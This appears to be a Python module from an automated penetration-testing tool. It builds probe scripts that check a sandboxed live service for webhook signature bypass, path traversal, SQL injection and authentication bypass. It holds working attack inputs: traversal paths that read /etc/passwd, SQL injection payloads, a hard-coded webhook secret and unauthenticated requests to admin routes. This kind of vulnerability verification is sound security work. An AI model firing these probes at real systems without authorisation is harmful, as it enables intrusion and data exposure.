"""HTTP probe templates — per-vuln-class attack scripts run against a
live service (indictment/service.py handle). A probe firing against the real
running app is the pen-test layer's verification: service-verified.

Each template gets the finding + handle and returns (bash script for
/poc/service-probe.sh, expected signal substring) or None if the class
has no service template for this target shape. Scripts are plain
strings with __HOST__ substituted (no f-strings — embedded dicts break
brace escaping).
"""
from __future__ import annotations

from indictment.store import Finding
from indictment.service import ServiceHandle


def _finish(script: str, h: ServiceHandle) -> str:
    # probes run inside the compose network — address the service by its
    # in-network name, not the host's 127.0.0.1
    base = h.internal_base or h.base_url
    return script.replace("__HOST__", base.split("//")[1])


# ---- template: webhook HMAC -> command execution (snare shape) -----------

def _webhook_exec(f: Finding, h: ServiceHandle) -> tuple[str, str] | None:
    """Fires crafted webhook POSTs (no sig / bad sig / valid sig with the
    known template secret) and watches the shared exec-side-effect file.
    Any 200+exec on an unsigned or wrongly-signed request = auth bypass;
    exec only on the correctly-signed request with a guessable/leaked
    secret = weak-secret finding. DEFENSE_HELD means the HMAC gate works.
    """
    script = """#!/bin/bash
cat > /poc/probe.py <<'PY'
import hmac, hashlib, json, time, urllib.request

BASE = "http://__HOST__"
SECRET = "crsknownsecret"
body = json.dumps({"action": "opened", "repository": {"name": "probe",
    "owner": {"login": "probeorg"}}, "sender": {"login": "probeuser"}}).encode()

def post(sig, tag):
    headers = {"Content-Type": "application/json",
               "X-GitHub-Event": "push"}
    if sig is not None:
        headers["X-Hub-Signature-256"] = sig
    req = urllib.request.Request(BASE + "/", data=body, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read(200).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200).decode(errors="replace")
    except Exception as e:
        return 0, str(e)

def exec_log():
    try:
        return open("/shared/ran.txt").read()
    except OSError:
        return ""

s_none, _ = post(None, "none")
s_bad, _ = post("sha256=" + "0" * 64, "bad")
good = "sha256=" + hmac.new(SECRET.encode(), body, hashlib.sha256).hexdigest()
s_good, _ = post(good, "good")
time.sleep(2)
log = exec_log()

print("STATUS none=%s bad=%s good=%s" % (s_none, s_bad, s_good))
print("EXECLOG: %r" % log.strip()[:200])

if (s_none == 200 or s_bad == 200) and "executed event=" in log:
    print("WEBHOOK_EXEC_CONFIRMED_UNSIGNED_BYPASS")
elif s_good == 200 and "executed event=" in log:
    # HMAC gate works; the secret is the KNOWN template secret — in a
    # real finding this branch means the secret was leaked/guessable.
    print("WEBHOOK_EXEC_CONFIRMED_KNOWN_SECRET")
elif s_none in (401, 403) and s_bad in (401, 403):
    print("DEFENSE_HELD: signature gate rejected unsigned/bad requests")
else:
    print("INCONCLUSIVE: statuses none=%s bad=%s good=%s log=%r"
          % (s_none, s_bad, s_good, log))
PY
python3 /poc/probe.py
"""
    return _finish(script, h), "WEBHOOK_EXEC_CONFIRMED"


# ---- template: path traversal / LFI --------------------------------------

def _path_traversal(f: Finding, h: ServiceHandle) -> tuple[str, str] | None:
    script = """#!/bin/bash
cat > /poc/probe.py <<'PY'
import urllib.request

BASE = "http://__HOST__"
paths = ["/", "/static/../../../../etc/passwd",
         "/static/..%2f..%2f..%2f..%2fetc/passwd",
         "/download?name=../../../../etc/passwd",
         "/files?path=/etc/passwd"]
hits = []
for p in paths:
    try:
        with urllib.request.urlopen(BASE + p, timeout=8) as r:
            body = r.read(4000).decode(errors="replace")
            if "root:" in body and "/bin/" in body:
                hits.append(p)
                print("VULN_CONFIRMED_TRAVERSAL_SERVICE:" + p)
    except Exception:
        continue
print("HITS", len(hits))
if not hits:
    print("DEFENSE_HELD: no traversal through service routes")
PY
python3 /poc/probe.py
"""
    return _finish(script, h), "VULN_CONFIRMED_TRAVERSAL_SERVICE"


# ---- template: SQLi (error + time based) ----------------------------------

def _sqli(f: Finding, h: ServiceHandle) -> tuple[str, str] | None:
    script = """#!/bin/bash
cat > /poc/probe.py <<'PY'
import time, urllib.request, urllib.parse, sys

BASE = "http://__HOST__"
ERRS = ("sql syntax", "sqlite3.", "psycopg2", "mysql",
        "unterminated string", "ORA-")
payloads = ["' OR '1'='1", "'; SELECT 1--", '1 UNION SELECT 1,2,3']
ROUTES = ("/?q=", "/search?q=", "/api/users?name=", "/?name=", "/login?u=")

def get(path):
    t0 = time.time()
    try:
        with urllib.request.urlopen(BASE + path, timeout=12) as r:
            return r.read(4000).decode(errors="replace"), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.read(4000).decode(errors="replace"), time.time() - t0
    except Exception:
        return "", -1

base_body, base_t = get("/")
for p in payloads:
    for route in ROUTES:
        body, dt = get(route + urllib.parse.quote(p))
        if any(e in body.lower() for e in ERRS):
            print("VULN_CONFIRMED_SQLI_SERVICE:error-based " + route + p)
            sys.exit(0)
        if base_t >= 0 and dt > base_t + 4.0:
            print("VULN_CONFIRMED_SQLI_SERVICE:time-based " + route + p)
            sys.exit(0)
print("DEFENSE_HELD: no SQLi signal through service routes")
PY
python3 /poc/probe.py
"""
    return _finish(script, h), "VULN_CONFIRMED_SQLI_SERVICE"


# ---- template: auth bypass / IDOR -----------------------------------------

def _auth_bypass(f: Finding, h: ServiceHandle) -> tuple[str, str] | None:
    script = """#!/bin/bash
cat > /poc/probe.py <<'PY'
import urllib.request, urllib.error, sys

BASE = "http://__HOST__"
ROUTES = ("/admin", "/api/admin", "/dashboard", "/users", "/api/me",
          "/private", "/api/keys")
AUTHS = ({}, {"Authorization": "Bearer x"}, {"Cookie": "session=x"})
for r in ROUTES:
    for auth in AUTHS:
        req = urllib.request.Request(BASE + r, headers=auth)
        try:
            resp = urllib.request.urlopen(req, timeout=8)
            body = resp.read(2000).decode(errors="replace")
            if resp.status == 200 and body.strip():
                print("VULN_CONFIRMED_AUTHBYPASS_SERVICE: %s open with %s"
                      % (r, auth))
                sys.exit(0)
        except urllib.error.HTTPError as e:
            if e.code >= 500:
                print("VULN_CONFIRMED_AUTHBYPASS_SERVICE: %s 5xx %d"
                      % (r, e.code))
                sys.exit(0)
        except Exception:
            continue
print("DEFENSE_HELD: probed routes require auth")
PY
python3 /poc/probe.py
"""
    return _finish(script, h), "VULN_CONFIRMED_AUTHBYPASS_SERVICE"


# ---- registry --------------------------------------------------------------

_TEMPLATES = {
    "cmd-injection": _webhook_exec,
    "rce": _webhook_exec,
    "auth-bypass": _auth_bypass,
    "path-traversal": _path_traversal,
    "lfi": _path_traversal,
    "sqli": _sqli,
}


def probe_for(f: Finding, h: ServiceHandle) -> tuple[str, str] | None:
    """Service probe for this finding, or None (no template for class or
    service shape). Scripts run sandboxed on the service network."""
    fn = _TEMPLATES.get(f.vuln_class)
    if fn is None:
        return None
    # webhook-exec template only makes sense for webhook-daemon targets;
    # gate on the service carrying our shared exec-log dir marker
    if fn is _webhook_exec:
        marker = h.shared / "webhook-template"
        if not marker.exists():
            return None
    return fn(f, h)
